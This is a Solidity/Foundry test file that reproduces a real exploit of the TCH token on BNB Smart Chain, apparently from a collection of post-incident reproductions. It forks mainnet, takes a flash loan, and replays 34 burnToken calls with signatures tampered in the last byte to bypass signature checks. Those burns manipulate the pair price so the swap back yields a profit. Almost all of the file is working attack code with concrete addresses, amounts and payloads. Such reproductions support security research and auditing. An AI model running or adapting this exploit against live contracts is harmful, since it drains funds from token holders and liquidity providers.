// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$18K
// Attacker : https://bscscan.com/address/0xb9596d6e53d81981b9f06ca2ca6d3e422232d575
// Attack Contract : https://bscscan.com/address/0x258850ec735f6532fe34fe24ef9628992a9b7e84
// Vulnerable Contract : https://bscscan.com/address/0x5d78cfc8732fd328015c9b73699de9556ef06e8e
// Attack Tx : https://bscscan.com/tx/0xa94338d8aa312ed4b97b2a4dcb27f632b1ade6f3abec667e3bf9f002a75dabe0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5d78cfc8732fd328015c9b73699de9556ef06e8e#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/DecurityHQ/status/1791180322882629713
// Hacking God :

interface ITCH is IERC20 {
    function burnToken(
        uint256 amount,
        uint256 nonce,
        bytes memory signature
    ) external;
}

contract ContractTest is Test {
    // Struct representing params for burnToken() flawed function
    // tamperedSig -> Signature with last byte replaced from '0x1c' (28) to '0x01' (1) or '0x1b' (27) to '0x00' (0)
    struct BurnInfo {
        uint256 amount;
        uint256 nonce;
        bytes tamperedSig;
    }

    Uni_Pair_V3 private constant BUSDT_USDC =
        Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Router_V2 private constant PancakeRouter =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ITCH private constant TCH =
        ITCH(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    address private constant busdt_tch =
        0xb7F1FFf722e68A6Fc44980f5D48d6d3Dbc1fe9cF;

    uint256 private constant flashAmount = 2_500_000e18;
    uint256 private constant blocknumToForkFrom = 38_776_239;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(BUSDT_USDC), "BUSDT_USDC");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(TCH), "TCH");
        vm.label(address(BUSDT), "BUSDT");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        BUSDT_USDC.flash(address(this), flashAmount, 0, bytes(""));

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        BUSDT.approve(address(PancakeRouter), type(uint256).max);
        TCH.approve(address(PancakeRouter), type(uint256).max);
        uint256 transferAmount = BUSDT.balanceOf(address(this)) - 101e18;
        BUSDT.transfer(busdt_tch, transferAmount);
        BUSDTToTCH();
        // Manipulating price in pair by burning TCH tokens
        burnTCH();
        BUSDT.transfer(busdt_tch, BUSDT.balanceOf(address(this)));
        TCH.transfer(busdt_tch, TCH.balanceOf(address(this)));
        TCHToBUSDT();
        BUSDT.transfer(address(BUSDT_USDC), flashAmount + fee0);
    }

    function BUSDTToTCH() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(TCH);

        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function TCHToBUSDT() private {
        address[] memory path = new address[](2);
        path[0] = address(TCH);
        path[1] = address(BUSDT);

        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function burnTCH() private {
        // Amounts, nonces and signatures obtained from regular txs to TCH token contract (burnToken() calls)
        // Example txs:
        // https://app.blocksec.com/explorer/tx/bsc/0x1b2d836049713075b8e46076331332d0bfe8ecfa5dfa94f1c5b0b70700e68d53
        // https://app.blocksec.com/explorer/tx/bsc/0x09cd1ee1ea50480b64176d36cf5565b00a7fb81dcaa3d2c89c3a9fdb601fbd0b
        BurnInfo[] memory burnInfos = new BurnInfo[](34);
        burnInfos[0] = BurnInfo({
            amount: 1_715_767_262,
            nonce: 150,
            tamperedSig: hex"0efd44ce4fa2b7389c7564381508142c56f7d530e7432f3334079782a624f85e5caf8c20f1d306bc40aaf7dddd58e6748aff3c7677df3771674d57ab44e0dc3001"
        });
        burnInfos[1] = BurnInfo({
            amount: 1_715_702_462,
            nonce: 141,
            tamperedSig: hex"46cd2b22bedb9e54d3882d85dc85f3281df0cec898d9728829ea6203c152e41c7a9a0b86bc08bd596493fde9e4d6e762360f4fe39b009140e7c4c0d9b8910b7800"
        });
        burnInfos[2] = BurnInfo({
            amount: 1_715_666_333,
            nonce: 134,
            tamperedSig: hex"839dc8cd66305dcf5a4871fa1df471bb2d615937afc1ed485d74d5366543f6b2768868e1fad2d64994e37f59b9db5bd0a030e0d584e15135b0685d0afcf11ab601"
        });
        burnInfos[3] = BurnInfo({
            amount: 1_715_666_345,
            nonce: 135,
            tamperedSig: hex"2fde155a1bef6ec335cba439ba9d223f5002e367a0aa5462108250d822453a58503b5bad2010c75651cd30e4ab771708bfdc5433c1b85ff85165d48e8beabb8301"
        });
        burnInfos[4] = BurnInfo({
            amount: 1_715_666_374,
            nonce: 136,
            tamperedSig: hex"5b0f6186968871298acae759874a344673868b4266d10c8c2255354c92cf443c4a5183c1ec4ac82b45b809d10290f61b0e67627d83e2d0f9d01df435bb79db3b01"
        });
        burnInfos[5] = BurnInfo({
            amount: 1_715_673_661,
            nonce: 137,
            tamperedSig: hex"cbaf90d5a983d199fc8b04bb79a3ec9aa055f10b8173b67d28cfb7340b41f76711d115b172d148711538558cef0e51dd3fd131e1686ce5bc5c94534d6f39cf6300"
        });
        burnInfos[6] = BurnInfo({
            amount: 1_715_688_062,
            nonce: 139,
            tamperedSig: hex"a6922c3aea1c2982280ce3fd7e319c9e3f6baca1bc038b807ce883deb16b264a38522cd2f389d4e2ce6c60fe039fadd9e54ab587765499af9d9a7a1a637c919600"
        });
        burnInfos[7] = BurnInfo({
            amount: 1_715_752_861,
            nonce: 148,
            tamperedSig: hex"2c1d52a33d20a17f10b013661a5d78ebd98ff09aaf09cbc1e789d09688aecb8232e0447d7e6a62d77eea63346f8de3224c4d7f7d5f5ae6feb10c9d4ad94106a201"
        });
        burnInfos[8] = BurnInfo({
            amount: 1_715_680_862,
            nonce: 138,
            tamperedSig: hex"469ca637ef50c13155153addedada41927094f0c7f36c3bd3d6552cdef59891f7e8120d019868089a528711bff19dcf4d54f83940bbd168b705383649e07a26a00"
        });
        burnInfos[9] = BurnInfo({
            amount: 1_715_695_261,
            nonce: 140,
            tamperedSig: hex"a06a69e09da47842596352c8fa8172b72d841daced4acbeb877cc58e1b9956611fa64f51f681ca8285a09f451a9987e0adc1c7fb1a4155cce8bf76fc479462b700"
        });
        burnInfos[10] = BurnInfo({
            amount: 1_715_709_662,
            nonce: 142,
            tamperedSig: hex"5b48ad16a782c08871b98e3d77df9c06cc9ac4f0dae9f7292840f8ff0367f8ad7d8bef5208ef8dcf2313b08a5da6e1b68ad64bb8db9f285f04e6fad74516d8b201"
        });
        burnInfos[11] = BurnInfo({
            amount: 1_715_716_862,
            nonce: 143,
            tamperedSig: hex"5a18b410f1e206710d63405ce754a4a1e186b6e801bbdc34dc3b48d45983c4f43623915c8ea42bbb72f0126388e1efc3a4c08f4df1f69a33da14b0f3fc27b20200"
        });
        burnInfos[12] = BurnInfo({
            amount: 1_715_731_261,
            nonce: 145,
            tamperedSig: hex"e54d849fb44a31a7f07c44315ee753812f04f886cf0e14649bec980b178c612866a99bd6c3b92e0438e7d642bbf4906e5d57092e7da257239d351cbe55c126bc01"
        });
        burnInfos[13] = BurnInfo({
            amount: 1_715_781_661,
            nonce: 152,
            tamperedSig: hex"b277329b575b0b6e45f7d45d1a0bda7dd58130fdea4c4ce6ac215486f7ebef845e4fc127ee3ae32e3dc3080d62152533c42c0f807dea3d184f1d06bfd2a6192100"
        });
        burnInfos[14] = BurnInfo({
            amount: 1_715_724_061,
            nonce: 144,
            tamperedSig: hex"4833fbc5f7bdd563451ffa7ab9446462eb7ad5ff80d77884d54e4c2f95687e423eaf3eb428ea63cab52e0aa07dbf3c41ff31cd96086a9a524e837a3126578ec500"
        });
        burnInfos[15] = BurnInfo({
            amount: 1_715_663_438,
            nonce: 133,
            tamperedSig: hex"96cb16d7c315236b73e94679414eda1dd607e37e34ce49ec78f51e4ba046d28937d54a3fed689392a54707116bdcc505c0e0b0ad7dfeb96fd8a29450f10425d600"
        });
        burnInfos[16] = BurnInfo({
            amount: 1_715_745_662,
            nonce: 147,
            tamperedSig: hex"261a8ddc13936314ebfe55386963939085b9988cb81e5a03ae26b90cc1c9095d29b5de7fe9f52e6f215c0ab3654d8dd8ab26591985d31ad36b1441c1e2d8867201"
        });
        burnInfos[17] = BurnInfo({
            amount: 1_715_760_062,
            nonce: 149,
            tamperedSig: hex"e2fd9d0fe23d72b58dc630a90a41129d298afb4d8928b7ab16961221cf340b4266418a83a0bbb081012509cc32a1f11cc0134b1971f9cfb1ea1a03624b4d897301"
        });
        burnInfos[18] = BurnInfo({
            amount: 1_715_824_862,
            nonce: 158,
            tamperedSig: hex"ad8f9d35d99bfc8c22451061bbd44229931460dd0a40f404695b7fcec00c084d23d172dedd17d224e9c1dcaa6b6cb16d66c4eb82151e388d89051dc4a9c42afc00"
        });
        burnInfos[19] = BurnInfo({
            amount: 1_715_810_462,
            nonce: 156,
            tamperedSig: hex"a2b44b9507a37b560c7a7bdaaf2f2b669c1b4538bf673d69c515a191bcb0fcba033355a1a6b247d9f36d38b34d7d19885f19a17c2409506912eab6964797986f01"
        });
        burnInfos[20] = BurnInfo({
            amount: 1_715_774_462,
            nonce: 151,
            tamperedSig: hex"2fe4c3b574c91ae745e499c489dbead5522f9a6d151d6ae290ebc34ce36558bb026a00b32dcbf59f2727da49602255cadc5a86087fb5043d31825954ddd60c4000"
        });
        burnInfos[21] = BurnInfo({
            amount: 1_715_853_662,
            nonce: 162,
            tamperedSig: hex"25c251e946bee3254851064269313c7f834905957299908f9a291d156641dde475fc41770455be71f7cbd765f8fe17f95d6820e916a7800b9c7d1da1f5e76e9d01"
        });
        burnInfos[22] = BurnInfo({
            amount: 1_715_846_461,
            nonce: 161,
            tamperedSig: hex"fbe3b8afc1137874bcad881c56b1565b8872e28d89d286c96973b0b175e0b98e6e9921f02a5023b5b140de40745bbcbd238fb9c20f7e3c4579eb2bb05604bdb701"
        });
        burnInfos[23] = BurnInfo({
            amount: 1_715_738_462,
            nonce: 146,
            tamperedSig: hex"94cba00c30d200c0e38efafd7bc255a3e53cde44ffe853a3dd79ee5f6dc69d705e553623bd4153e97219c33da85da64533db3c762b302c13200211063e109fe901"
        });
        burnInfos[24] = BurnInfo({
            amount: 1_715_796_062,
            nonce: 154,
            tamperedSig: hex"83ab7e79c020b0fd2ec60d93cf5de4afb0662f856cd0c97300ec7d237318f3ee0fd26cfc937133c05e4acd8fbe4cca8c76a586f5f048b322627f929ba0c2344801"
        });
        burnInfos[25] = BurnInfo({
            amount: 1_715_788_862,
            nonce: 153,
            tamperedSig: hex"4404d56191c14fbf5cb1ed7a5fd97c8e66f428427d73c5dcea26fd753139877332a4e31ba4a9a3ec87f709ac0c572f62a912a3f05cfd93866c57f34ef0a4f0d900"
        });
        burnInfos[26] = BurnInfo({
            amount: 1_715_817_661,
            nonce: 157,
            tamperedSig: hex"6333e4f4f15ebdc68645682c14257f8a0016365a5c8a0a330cffab67f78ce5865493ddbbcbeeeb2d5404a7d788666d207963f9954e37a9f5bb53e0adc21cde3a00"
        });
        burnInfos[27] = BurnInfo({
            amount: 1_715_854_942,
            nonce: 163,
            tamperedSig: hex"21af77c9eeaddfbe4b4a764c3d17c4110d443fd2cc32f5b09231b87e284c81940f2a3e32877c4de728f34290760ea7b075712e06b9640a437153a4447cc420b401"
        });
        burnInfos[28] = BurnInfo({
            amount: 1_715_855_021,
            nonce: 164,
            tamperedSig: hex"884595f25a0a7abe681730e9cb3c8a4f118e00e723c24947d9189a8965305bdf268c1ae697a2511ef7972210090f2290df99ae7034bd3f6684eca3f0d285742b00"
        });
        burnInfos[29] = BurnInfo({
            amount: 1_715_855_044,
            nonce: 165,
            tamperedSig: hex"71a0c08b9d140fe42a594f44143db503d85220ae042f4c9a498f2388679cc71670e1d2457c2d88f1a8c7792ad922b8fa29145b85baab5501035f9f811967eb3301"
        });
        burnInfos[30] = BurnInfo({
            amount: 1_715_855_198,
            nonce: 166,
            tamperedSig: hex"cc1dd746893e43723efd75891a6333a485d9d4717a8d8b0c945675770c3567295c21cd69ec1188a5ef5276b4e910a5fba2de7d6f9f38339cfffcc6f27d46861c01"
        });
        burnInfos[31] = BurnInfo({
            amount: 1_715_839_261,
            nonce: 160,
            tamperedSig: hex"b6f60a1331ebf0756ce103c5a8cc9392ca7f0b589446ff7e617aab85e5bbeaca3bf66b944a95dd599eec03e3e362d7b571bad1206443b4e5b69ee29609966b0e01"
        });
        burnInfos[32] = BurnInfo({
            amount: 1_715_832_061,
            nonce: 159,
            tamperedSig: hex"ed3aedd4a78ce67d7e50192cf4956df09a9b0df07ca65ef126a7c6397d959f372f57ec524d91b7fe86cb7a37545dcfdb56e5e2246b424531ae457a77dc2a46b201"
        });
        burnInfos[33] = BurnInfo({
            amount: 1_715_803_262,
            nonce: 155,
            tamperedSig: hex"530b6c435d5555438c37a5c7c3cd55681709ecb778aa73cb800cbb53f8b6eae53eacd1030fd26398bb994a76ab35cd915ce6f1c0032fe66f6a31713fb396088701"
        });

        for (uint256 i; i < burnInfos.length; ++i) {
            BurnInfo memory burnInfo = burnInfos[i];
            TCH.burnToken(
                burnInfo.amount,
                burnInfo.nonce,
                burnInfo.tamperedSig
            );
        }
    }
}
